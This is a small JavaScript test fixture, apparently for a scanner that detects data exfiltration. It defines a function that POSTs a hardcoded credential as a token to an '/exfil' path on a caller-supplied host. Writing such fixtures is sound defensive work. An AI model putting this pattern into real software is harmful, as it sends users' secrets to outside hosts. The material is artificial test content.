// Phase 11 (Track J.9) — JavaScript DATA_EXFIL vuln fixture.
const http = require('http');

function run(host) {
    const secret = 'alice-creds';
    const req = http.request({
        host,
        path: '/exfil?token=' + encodeURIComponent(secret),
        method: 'POST',
    });
    req.end();
}

module.exports = { run };
